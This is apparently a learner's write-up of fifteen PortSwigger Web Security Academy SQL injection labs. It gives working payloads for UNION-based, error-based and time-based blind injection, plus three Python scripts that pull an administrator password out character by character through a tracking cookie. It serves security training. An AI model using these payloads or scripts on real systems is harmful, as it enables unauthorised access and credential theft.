
# Lab 1

## Description

This lab contains a SQL injection vulnerability in the product category filter. When the user selects a category, the application carries out a SQL query like the following:

`SELECT * FROM products WHERE category = 'Gifts' AND released = 1`

To solve the lab, perform a SQL injection attack that causes the application to display one or more unreleased products.


## Solution

Easy solution is to list every item regardless of `release` state using:

```
/filter?category=t%27+or+1=1+--+-
```


# Lab 2

## Description

This lab contains a SQL injection vulnerability in the login function.

To solve the lab, perform a SQL injection attack that logs in to the application as the `administrator` user.

## Solution

Again very easy solution:

On login page input:

```
test' or 1=1 -- -
```

or inside the POST request:

```
username=test%27+or+1%3D1+--+-
```

so the query returns true regardless of `username` or `password`.


# Lab 3

## Description

This lab contains a SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.

To solve the lab, display the database version string.

## Solution

First off determine number of columns with incrementing `order by` like this:

```
/filter?category=Corporate+gifts'+order+by+1+--+- -> 200
/filter?category=Corporate+gifts'+order+by+2+--+- -> 200
/filter?category=Corporate+gifts'+order+by+3+--+- -> 500
```

which means there are 2 columns. Implementing this into the `union select` query:

```
/filter?category=Corporate+gifts'+union+select+NULL,NULL+from+dual+--+- -> 200
```

The version number can be retrieved by reading following cheatsheet:

```
https://portswigger.net/web-security/sql-injection/cheat-sheet
```

which this case translates to:

```
/filter?category=Corporate+gifts'+union+select+banner,banner+from+v$version+--+-
```

and returns:

```
<tr>
                            <th>CORE	11.2.0.2.0	Production</th>
                            <td>CORE	11.2.0.2.0	Production</td>
                        </tr>
```


# Lab 4

## Description

This lab contains a SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.

To solve the lab, display the database version string.

## Solution

Same start using `order by` to verify column numbers:

```
/filter?category=Accessories'+order+by+2+--+- -> 200
/filter?category=Accessories'+order+by+3+--+- -> 500
```

Then following the cheatsheet this payload:

```
/filter?category=Accessories'+union+select+@@version,@@version+from+information_schema.columns+--+-
```

results in:

```
<tr>
	<th>8.0.42-0ubuntu0.20.04.1</th>
	<td>8.0.42-0ubuntu0.20.04.1</td>
</tr>
```

It looks like this works as well:

```
/filter?category=Accessories'+union+select+@@version,@@version+--+-
```

basically removing the `from` statement -> MySQL doesn't need a `from` statement?


# Lab 5

## Description

This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.

The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.

To solve the lab, log in as the `administrator` user.

## Solution

Starting as usual on the same entry point:

```
/filter?category=test'+order+by+2+--+- -> 200
/filter?category=test'+order+by+3+--+- -> 500
```

Then using `UNION SELECT` and cheatsheet to determine DB version:

```
/filter?category=test'+union+select+version(),null+--+-
```

which returns:

```
[...]
PostgreSQL 12.22 (Ubuntu 12.22-0ubuntu0.20.04.4) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 9.4.0-1ubuntu1~20.04.2) 9.4.0, 64-bit
[...]
```

Further following the cheatsheet shows the query to list tables:

```
SELECT * FROM information_schema.tables
```

Implementing it into the payload:

```
/filter?category=test'+union+SELECT+table_name,null+FROM+information_schema.tables+--+-
```

the wildcard character couldn't be used here because of the difference in column numbers.

This returns a lot of table names. To narrow down the user defined tables, inspiration can be taken from this article:

```
https://www.commandprompt.com/education/postgresql-list-all-tables/
```

especially this query:

```
SELECT tablename,null FROM pg_catalog.pg_tables WHERE schemaname != 'pg_catalog' AND schemaname != 'information_schema';
```

This gives the payload:

```
/filter?category=test'+union+SELECT+tablename,null+FROM+pg_catalog.pg_tables+WHERE+schemaname+!%3d+'pg_catalog'+AND+schemaname+!%3d+'information_schema'+--+-
```

which returns:

```
[...]
<tr>
	<th>products</th>
</tr>
<tr>
	<th>users_rnludd</th>
</tr>
[...]
```

listing the tables created by the user. 

Now, it is unclear in which database these tables are. One 'dirty' trick would be the following:

```
/filter?category=test'+union+SELECT+datname,null+FROM+pg_database+--+-
```

to list database names, which returns:

```
[...]
<tbody>
<tr>
	<th>template0</th>
</tr>
<tr>
	<th>postgres</th>
</tr>
<tr>
	<th>academy_labs</th>
</tr>
<tr>
	<th>template1</th>
</tr>
</tbody>
[...]
```

Now Fuzzing for the correct database -> good idea but couldn't get it to work so took the following route:

After finding this:

```
https://stackoverflow.com/questions/20194806/how-to-get-a-list-column-names-and-datatypes-of-a-table-in-postgresql
```

with this query:

```
SELECT
    column_name,
    data_type
FROM
    information_schema.columns
WHERE
    table_name = 'table_name';

```

now adjusting the payload:

```
/filter?category=test'+union+SELECT+column_name,null+FROM+information_schema.columns+where+table_name='users_rnludd'+--+-
```

returns:

```
[...]
<tr>
	<th>email</th>
</tr>
<tr>
	<th>password_nivzos</th>
</tr>
<tr>
	<th>username_mivibn</th>
</tr>

[...]
```

Knowing this the following payload can be crafted:

```
/filter?category=test'+union+SELECT+username_mivibn,password_nivzos+FROM+users_rnludd+--+-
```

which returns:

```
<tbody>
<tr>
	<th>administrator</th>
	<td>558b7q0w3cxnrhmr4d6b</td>
</tr>
<tr>
	<th>carlos</th>
	<td>hlywkxmlw2r62a3paet1</td>
</tr>
<tr>
	<th>wiener</th>
	<td>kwc447hnzyjblme8wnbz</td>
</tr>
</tbody>
```

After logging in as `administrator` the lab is solved.

**NOTE:** This challenges highlights the importance of knowing at least some basic queries in multiple SQL frameworks. 


# Lab 6

## Description

This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.

The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.

To solve the lab, log in as the `administrator` user.

## Solution

First off confirming the column number and the database version:

```
/filter?category=wer'+union+select+banner,null+from+v$version+--+-
```

returns:

```
Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production
```

which confirms `Oracle`.

Listing all tables with:

```
/filter?category=wer'+union+select+table_name,null+from+all_tables+--+-
```

and searching for `user` shows:

```
[...]
USERS_YOBLOD
[...]
```

Now searching for column names with:

```
/filter?category=wer'+union+select+column_name,null+from+all_tab_columns+where+table_name='USERS_YOBLOD'+--+-
```

which returns:

```
[...]
<tr>
	<th>PASSWORD_WGKYJW</th>
</tr>
<tr>
	<th>USERNAME_POJSOQ</th>
</tr>
[...]
```

Finally, using all the above findings in one query:

```
/filter?category=wer'+union+select+USERNAME_POJSOQ,PASSWORD_WGKYJW+from+USERS_YOBLOD+--+-
```

returns the admin credentials:

```
[...]
<tr>
	<th>administrator</th>
	<td>jkoh2ydcblnmcaunwb5r</td>
</tr>
[...]
```

Logging in as the user `administrator` solves the challenge.


# Lab 7

## Description

This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. The first step of such an attack is to determine the number of columns that are being returned by the query. You will then use this technique in subsequent labs to construct the full attack.

To solve the lab, determine the number of columns returned by the query by performing a SQL injection UNION attack that returns an additional row containing null values.

## Solution

Finding the column number:

```
/filter?category=Clo'+union+select+null,null,null--
```

solves the lab.


# Lab 8

## Description

This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you first need to determine the number of columns returned by the query. You can do this using a technique you learned in a [previous lab](https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns). The next step is to identify a column that is compatible with string data.

The lab will provide a random value that you need to make appear within the query results. To solve the lab, perform a SQL injection UNION attack that returns an additional row containing the value provided. This technique helps you determine which columns are compatible with string data.

## Solution

Using `'a'` to pinpoint a suitable column:

```
/filter?category=Gi%27+union+select+null,'a',null--
```

Now using the randomly generated string provided:

```
/filter?category=Gi%27+union+select+null,%27tKHyBV%27,null--
```

solves the lab.


# Lab 9

## Description

This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you need to combine some of the techniques you learned in previous labs.

The database contains a different table called `users`, with columns called `username` and `password`.

To solve the lab, perform a SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the `administrator` user.


## Solution

Following description instructions:

```
/filter?category=Gi%27+union+select+username,password+from+users--
```

shows the users credentials.

Using these to login as the administrator solves the lab.

# Lab 10

## Description

This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.

The database contains a different table called `users`, with columns called `username` and `password`.

To solve the lab, perform a SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the `administrator` user.

## Solution

Checking which fields are visible:

```
/filter?category=Gi'+union+select+null,+'abc'+--
```

then ajusting the payload as follows:

```
/filter?category=Gi'+union+select+null,+username+||+'-'+||+password+from+users+--
```

which returns:

```
[...]
<th>administrator-upc241pv9reg587a7lhx</th>
[...]
```

Using these credentials and logging in as user `administrator` solves the lab.


# Lab 11

## Description

This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

The results of the SQL query are not returned, and no error messages are displayed. But the application includes a `Welcome back` message in the page if the query returns any rows.

The database contains a different table called `users`, with columns called `username` and `password`. You need to exploit the blind SQL injection vulnerability to find out the password of the `administrator` user.

To solve the lab, log in as the `administrator` user.

## Solution

Injecting into cookies with:

```
931HtmOKdfI1PXUs' or (select 'a' from users where username='administrator' and length(password)>3)='a
```

to determine password length. Can be send to intruder for faster finding.

Which reveals true for `>19` and false for `>20`, meaning the password is 20 characters long.

Now finding the right payload to extract the password:

```
931HtmOKdfI1PXUs' or (select 'a' from users where username='administrator' and password='d%')='a
```

when finding the right character (the server returning 'Welcome' message - or length = 4022), one should keep the character and move to the next guess.

Using a python script for this automation (finally doing it the old fashion way):

```
import requests

letters="abcdefghijklmnopqrstuvwxyz1234567890"

url = "https://0aa7004b03d1501d81dbca9200600080.web-security-academy.net/filter?category=/filter?category=Gi"

i=0

password = ""
cookie_before = "931HtmOKdfI1PXUs'%20or%20(select%20'a'%20from%20users%20where%20username%3d'administrator'%20and%20password%20like%20'"
cookie_after = "%25')%3d'a"
phrase = "Welcome"

for i in range(20):
	for letter in letters:
		cookie_full = cookie_before + password + letter + cookie_after
		cookies = {"TrackingId": cookie_full}
		response = requests.get(url, cookies=cookies)
		#print("pass " + password + " with response length of " + str(len(response.content)))
		#print(response.text)
		if phrase in response.text :
			password = password + letter
			print("Char found: " + letter + " full pass so far: " + password)
			break
	i = i+1

print("Done!")		

```

Waiting until the password is extracted and logging in as `administrator` solves the lab.


# Lab 12

## Description

This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows. If the SQL query causes an error, then the application returns a custom error message.

The database contains a different table called `users`, with columns called `username` and `password`. You need to exploit the blind SQL injection vulnerability to find out the password of the `administrator` user.

To solve the lab, log in as the `administrator` user.

## Solution

As the hint suggests, the SQL framework  is `Oracle`. Which shows by using:

```
Cookie: TrackingId=PmyiCijsgXQew43e'||(select+'')||'
```

returning:

```
500 error
```

and:

```
Cookie: TrackingId=PmyiCijsgXQew43e'||(select+''+from+dual)||'
```

returning:

```
200 OK
```

Oracle erroring out without explicit table name.

Confirming table name with:

```
Cookie: TrackingId=PmyiCijsgXQew43e'||(select+''+from+users+where+ROWNUM=1)||'
```

returns:

```
200 OK
```

Building a conditional error phrase:

```
PmyiCijsgXQew43e'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE NULL END FROM dual)||'
```

When true -> error
When false -> OK

This reduces errors from the server and would be stealthier in a real world assessment.

Building the condition:

**To recap:** Need to find the password length of the admin:

```
(select 'a' from users where username='administrator' and length(password)>3)='a')
```

Full payload:

```
PmyiCijsgXQew43e'||(SELECT CASE WHEN ((select 'a' from users where username='administrator' and length(password)>3)='a') THEN TO_CHAR(1/0) ELSE NULL END FROM dual)||'
```

Which errors out on until:

```
length(password)>20 - same length as before
```

Now that the length is know, a searching payload needs to be written before automation:

```
PmyiCijsgXQew43e'||(SELECT CASE WHEN (select 'a' from users where username='administrator' and password like '%')='a' THEN TO_CHAR(1/0) ELSE NULL END FROM dual)||'
```


Adapting the python script to match this payload:

```
import requests

letters="abcdefghijklmnopqrstuvwxyz1234567890"

url = "https://0adf00a804b9d9938058676a00b500e3.web-security-academy.net/filter?category=Gifts"

password = ""
cookie_before = "PmyiCijsgXQew43e'%7c%7c(SELECT%20CASE%20WHEN%20(select%20'a'%20from%20users%20where%20username%3d'administrator'%20and%20password%20like%20'"
cookie_after = "%25')%3d'a'%20THEN%20TO_CHAR(1%2f0)%20ELSE%20NULL%20END%20FROM%20dual)%7c%7c'"

for i in range(20):
	for letter in letters:
		cookie_full = cookie_before + password + letter + cookie_after
		cookies = {"TrackingId": cookie_full}
		response = requests.get(url, cookies=cookies)
		#print("pass " + password + " with response length of " + str(len(response.content)))
		#print(str(response.status_code) + " on letter " + letter)
		if response.status_code == 500 :
			password = password + letter
			print("Char found: " + letter + " full pass so far: " + password)
			break
	i = i+1

print("Done!")

```

using the password printed in terminal on acccount login `administrator` solves the lab.


# Lab 13

## Description

This lab contains a SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie. The results of the SQL query are not returned.

The database contains a different table called `users`, with columns called `username` and `password`. To solve the lab, find a way to leak the password for the `administrator` user, then log in to their account.


## Solution

Heading to:

```
/filter?category=Gifts
```

and testing the Cookie `TrackingId` with:

```
TrackingId=eFWX3Id20TLEmHHl'
```

returns:

```
500
```

and:

```
TrackingId=eFWX3Id20TLEmHHl''
```

returns:

```
200
```

which confirms SQL injection.

Using the cheatsheet:

```
https://www.portswigger.net/web-security/sql-injection/cheat-sheet
```

and constructing following payload:

```
' AND 1=CAST((SELECT user FROM users LIMIT 1) AS int)--
```

returns:

```
ERROR: invalid input syntax for type integer: "peter"
```

adapting the payload to extract the first password of the database (which corresponds to the admin password):

```
ERROR: invalid input syntax for type integer: "7x3nuqvo1m16cyf04p01"
```

Login with these credentials as `administrator` solves the lab.


# Lab 14

## Description

This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows or causes an error. However, since the query is executed synchronously, it is possible to trigger conditional time delays to infer information.

To solve the lab, exploit the SQL injection vulnerability to cause a 10 second delay.


## Solution

From previous labs I know the DB is PostgreSQL.

Building following payload:

```
Cookie: TrackingId=sTdosUf21dI1oCpX'||pg_sleep(10)||';
```

solves the lab.


# Lab 15

## Description

This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows or causes an error. However, since the query is executed synchronously, it is possible to trigger conditional time delays to infer information.

The database contains a different table called `users`, with columns called `username` and `password`. You need to exploit the blind SQL injection vulnerability to find out the password of the `administrator` user.

To solve the lab, log in as the `administrator` user.

## Solution

Making sure the payload from the previous lab still works:

```
Cookie: TrackingId=8IAW3WNd6H6gbyB1'||pg_sleep(5)||';
```

returns a ~5s delay -> works.

Implementing conditional trigger:

```
4pgmXnkC7KDctQhv';select case when ('a'='a') then pg_sleep(5) else pg_sleep(0) end--
```

adapting to check user `administrator` exists:

```
4pgmXnkC7KDctQhv';select case when ((select 'a' from users where username='administrator')='a') then pg_sleep(5) else pg_sleep(0) end--
```

checking password length:

```
4pgmXnkC7KDctQhv';select case when ((select 'a' from users where username='administrator' and length(password)>3)='a') then pg_sleep(5) else pg_sleep(0) end--
```

Changing condition order to reduce scanning time:

```
4pgmXnkC7KDctQhv';select case when ((select 'a' from users where username='administrator' and length(password)>)='a') then pg_sleep(0) else pg_sleep(5) end--
```

which confirms the password length is `20`.

Adapting payload for password extraction:

```
4pgmXnkC7KDctQhv';select case when (select 'a' from users where username='administrator' and password like '%')='a' then pg_sleep(5) else pg_sleep(0) end--
```

Adapting the python script from before:

```
import requests

letters="abcdefghijklmnopqrstuvwxyz1234567890"

url = "https://0a0e007e037890f081a28ed500a90070.web-security-academy.net/filter?category=Gifts"

password = ""
cookie_before = "4pgmXnkC7KDctQhv'%3bselect%20case%20when%20(select%20'a'%20from%20users%20where%20username%3d'administrator'%20and%20password%20like%20'"
cookie_after = "%25')%3d'a'%20then%20pg_sleep(5)%20else%20pg_sleep(0)%20end--"

for i in range(20):
	for letter in letters:
		cookie_full = cookie_before + password + letter + cookie_after
		cookies = {"TrackingId": cookie_full}
		response = requests.get(url, cookies=cookies)
		#print("pass " + password + " with response length of " + str(len(response.content)))
		#print(str(response.status_code) + " on letter " + letter)
		if response.elapsed.total_seconds()>5:
			print(str(response.elapsed.total_seconds()))
			password = password + letter
			print("Char found: " + letter + " full pass so far: " + password)
			break
	i = i+1

print("Done!")
```

It's even slower than the other scripts but it works.

**Note:** Use threads to speed up this.

Using the extracted password with username `administrator` solves the lab.





